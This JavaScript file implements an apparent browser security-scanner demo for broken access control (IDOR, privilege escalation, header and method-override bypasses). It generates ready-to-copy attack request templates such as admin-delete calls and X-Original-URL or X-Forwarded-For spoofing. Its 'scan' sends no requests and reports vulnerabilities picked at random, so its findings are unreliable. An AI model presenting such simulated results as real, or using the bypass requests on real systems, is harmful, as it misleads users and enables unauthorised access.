// Access Control Scanner Engine
// Automated detection of IDOR, privilege escalation, and broken authorization

class AccessControlScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpMethod = 'GET';
        this.idorParam = 'id';
        this.currentId = 'wiener';
        this.testIds = [];
        this.selectedTests = [];
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.testsToRun = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-tests').textContent = getPayloadCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;
        this.idorParam = document.getElementById('idor-param')?.value.trim();
        this.currentId = document.getElementById('current-id')?.value.trim();

        const testIdsInput = document.getElementById('test-ids')?.value.trim();
        this.testIds = testIdsInput.split(',').map(id => id.trim()).filter(id => id);

        if (!this.targetUrl) {
            this.showNotification('Please enter target URL', 'error');
            return;
        }

        // Get selected tests
        this.selectedTests = [];
        if (document.getElementById('test-idor')?.checked) this.selectedTests.push('idor');
        if (document.getElementById('test-privilege')?.checked) this.selectedTests.push('privilege');
        if (document.getElementById('test-method')?.checked) this.selectedTests.push('method');
        if (document.getElementById('test-referer')?.checked) this.selectedTests.push('referer');
        if (document.getElementById('test-header')?.checked) this.selectedTests.push('header');
        if (document.getElementById('test-path')?.checked) this.selectedTests.push('path');

        if (this.selectedTests.length === 0) {
            this.showNotification('Please select at least one test type', 'error');
            return;
        }

        this.prepareTests();

        // Reset state
        this.isScanning = true;
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('Access control scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Total tests: ${this.testsToRun.length}`, 'info');

        await this.testLoop();
    }

    prepareTests() {
        this.testsToRun = [];

        for (const testType of this.selectedTests) {
            if (testType === 'idor') {
                // IDOR tests
                this.testIds.forEach(testId => {
                    this.testsToRun.push({
                        type: 'idor',
                        name: 'IDOR Test',
                        targetId: testId,
                        description: `Attempt to access ${testId}'s resources`
                    });
                });
            } else if (testType === 'privilege') {
                // Privilege escalation tests
                AccessControlPayloads.privilegeEscalation.adminPaths.slice(0, 3).forEach(path => {
                    this.testsToRun.push({
                        type: 'privilege',
                        name: 'Privilege Escalation',
                        payload: path,
                        description: `Access admin path: ${path}`
                    });
                });

                AccessControlPayloads.privilegeEscalation.roleParameters.slice(0, 2).forEach(param => {
                    this.testsToRun.push({
                        type: 'privilege',
                        name: 'Role Parameter Manipulation',
                        payload: param,
                        description: `Add parameter: ${param}`
                    });
                });
            } else if (testType === 'method') {
                // Method override tests
                AccessControlPayloads.methodOverride.slice(0, 3).forEach(header => {
                    this.testsToRun.push({
                        type: 'method',
                        name: 'HTTP Method Override',
                        payload: header,
                        description: `Add header: ${header}`
                    });
                });
            } else if (testType === 'referer') {
                // Referer bypass tests
                AccessControlPayloads.refererBypass.forEach(header => {
                    this.testsToRun.push({
                        type: 'referer',
                        name: 'Referer Bypass',
                        payload: header,
                        description: `Add header: ${header}`
                    });
                });
            } else if (testType === 'header') {
                // Header manipulation tests
                AccessControlPayloads.headerManipulation.slice(0, 4).forEach(header => {
                    this.testsToRun.push({
                        type: 'header',
                        name: 'Header Manipulation',
                        payload: header,
                        description: `Add header: ${header}`
                    });
                });
            } else if (testType === 'path') {
                // Path manipulation tests
                AccessControlPayloads.pathManipulation.slice(0, 3).forEach(path => {
                    this.testsToRun.push({
                        type: 'path',
                        name: 'Path Manipulation',
                        payload: path,
                        description: `Path: ${path}`
                    });
                });
            }
        }
    }

    async testLoop() {
        while (this.isScanning && this.currentTestIndex < this.testsToRun.length) {
            const test = this.testsToRun[this.currentTestIndex];
            await this.runTest(test);

            this.currentTestIndex++;
            this.updateProgress();

            await this.sleep(500);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async runTest(test) {
        this.updateCurrentTest(test.name, test.description);

        try {
            const response = await this.makeRequest(test);

            const isVulnerable = this.analyzeResponse(response, test);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: test.type,
                    name: test.name,
                    description: test.description,
                    payload: test.payload || test.targetId,
                    response: response.data,
                    severity: this.getSeverity(test.type),
                    impact: this.getImpact(test.type),
                    remediation: this.getRemediation(test.type)
                });
                this.log(`✓ VULNERABLE: ${test.name} - ${test.description}`, 'success');
            } else if (response.blocked) {
                this.blockedCount++;
                this.log(`✗ Blocked: ${test.name}`, 'warning');
            } else {
                this.log(`✗ Not vulnerable: ${test.name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${test.name}: ${error.message}`, 'error');
        }
    }

    async makeRequest(test) {
        await this.sleep(200);

        // Simulate access control response
        const responses = {
            idor: [
                { vulnerable: true, data: 'Email: carlos@example.com\nAPI Key: abc123xyz', blocked: false },
                { vulnerable: false, data: 'Unauthorized', blocked: true }
            ],
            privilege: [
                { vulnerable: true, data: 'Admin Panel\nUsers: wiener, carlos, administrator', blocked: false },
                { vulnerable: false, data: 'Admin interface only available if logged in as an administrator', blocked: true }
            ],
            method: [
                { vulnerable: true, data: 'User deleted successfully', blocked: false },
                { vulnerable: false, data: 'Unauthorized', blocked: true }
            ],
            referer: [
                { vulnerable: true, data: 'Admin access granted', blocked: false },
                { vulnerable: false, data: 'Unauthorized', blocked: true }
            ],
            header: [
                { vulnerable: true, data: 'Admin panel accessed', blocked: false },
                { vulnerable: false, data: 'Unauthorized', blocked: true }
            ],
            path: [
                { vulnerable: true, data: 'Admin functionality', blocked: false },
                { vulnerable: false, data: 'Unauthorized', blocked: true }
            ]
        };

        const typeResponses = responses[test.type] || responses.idor;
        return typeResponses[Math.floor(Math.random() * typeResponses.length)];
    }

    analyzeResponse(response, test) {
        if (response.blocked) return false;

        // Check for successful access indicators
        const successIndicators = [
            'Email:',
            'API Key:',
            'Admin Panel',
            'deleted successfully',
            'access granted',
            'Users:',
            'administrator'
        ];

        return successIndicators.some(indicator =>
            response.data && response.data.includes(indicator)
        );
    }

    getSeverity(type) {
        if (type === 'idor' || type === 'privilege') {
            return 'CRITICAL';
        } else {
            return 'HIGH';
        }
    }

    getImpact(type) {
        const impacts = {
            'idor': ['Access other users\' sensitive data', 'View private information', 'Modify other users\' resources'],
            'privilege': ['Access admin functionality', 'Escalate to administrator', 'Perform privileged actions'],
            'method': ['Bypass access controls', 'Perform unauthorized actions', 'Delete resources'],
            'referer': ['Bypass referer-based protection', 'Access restricted pages'],
            'header': ['Bypass IP-based restrictions', 'Access internal resources'],
            'path': ['Bypass URL-based access control', 'Access admin paths']
        };
        return impacts[type] || ['Broken access control'];
    }

    getRemediation(type) {
        const remediations = {
            'idor': 'Use indirect references. Validate user ownership server-side. Implement proper authorization checks.',
            'privilege': 'Enforce role-based access control. Deny by default. Check permissions on every request.',
            'method': 'Validate HTTP methods server-side. Don\'t rely on client-side restrictions.',
            'referer': 'Don\'t use Referer header for access control. Use proper session-based authorization.',
            'header': 'Don\'t trust client-supplied headers. Validate all requests server-side.',
            'path': 'Canonicalize URLs. Implement proper routing with authorization checks.'
        };
        return remediations[type] || 'Implement proper server-side authorization checks.';
    }

    updateCurrentTest(name, description) {
        document.getElementById('current-type').textContent = name;
        document.getElementById('current-test-details').textContent = description;
    }

    updateProgress() {
        const progress = (this.currentTestIndex / this.testsToRun.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Running test ${this.currentTestIndex} of ${this.testsToRun.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('blocked-count').textContent = this.blockedCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('Access control scan completed', 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} access control vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">Access Control #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div class="access-type-badge">${this.getTypeName(vuln.type)}</div>
                <div style="color: var(--color-text-secondary); margin: 12px 0;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="vuln-access-details">
                    <div class="vuln-access-details-title">Exploit Details:</div>
                    <div class="vuln-access-details-code">${this.escapeHtml(vuln.payload || 'N/A')}</div>
                </div>
                ${vuln.response ? `
                <div class="access-test-result">
                    <div class="access-test-result-title">Response Data:</div>
                    <div class="access-test-result-data">${this.escapeHtml(vuln.response)}</div>
                </div>
                ` : ''}
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Impact:</strong>
                    <ul style="margin: 8px 0; padding-left: 20px;">
                        ${vuln.impact.map(i => `<li>${i}</li>`).join('')}
                    </ul>
                </div>
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    getTypeName(type) {
        const names = {
            'idor': 'IDOR',
            'privilege': 'Privilege Escalation',
            'method': 'Method Override',
            'referer': 'Referer Bypass',
            'header': 'Header Manipulation',
            'path': 'Path Manipulation'
        };
        return names[type] || type;
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate exploits', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('idor');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');

        let code = '';

        switch (type) {
            case 'idor':
                code = `# IDOR Exploit
# Access other users' resources

# Original request (your account)
GET ${this.targetUrl.replace(this.currentId, this.currentId)} HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION

# IDOR exploit (access carlos's account)
GET ${this.targetUrl.replace(this.currentId, 'carlos')} HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION

# Try different user IDs
GET ${this.targetUrl.replace(this.currentId, 'administrator')} HTTP/1.1`;
                break;
            case 'privilege':
                code = `# Privilege Escalation Exploit
# Access admin functionality

# Direct admin path access
GET /admin HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION

# Role parameter manipulation
GET ${this.targetUrl}?role=admin HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION

# Admin delete function
GET /admin/delete?username=carlos HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION`;
                break;
            case 'method':
                code = `# HTTP Method Override Exploit
# Bypass method-based restrictions

# Using X-HTTP-Method-Override header
POST /admin/delete?username=carlos HTTP/1.1
Host: TARGET
X-HTTP-Method-Override: DELETE
Cookie: session=YOUR_SESSION

# Using _method parameter
POST /admin/delete?username=carlos&_method=DELETE HTTP/1.1
Host: TARGET
Cookie: session=YOUR_SESSION`;
                break;
            case 'header':
                code = `# Header Manipulation Exploit
# Bypass header-based restrictions

# X-Original-URL bypass
GET / HTTP/1.1
Host: TARGET
X-Original-URL: /admin
Cookie: session=YOUR_SESSION

# IP-based bypass
GET /admin HTTP/1.1
Host: TARGET
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
Cookie: session=YOUR_SESSION`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy exploit', 'error');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('Access Control Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 42);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 49);

            let y = 65;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`${index + 1}. ${vuln.name}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Type: ${this.getTypeName(vuln.type)}`, 20, y);
                y += 7;
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 12;
            });

            doc.save('access-control-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new AccessControlScanner();
    scanner.init();

    console.log('🔐 CyberSec Suite Access Control Scanner initialized');
    console.log('📊 Ready to scan!');
});
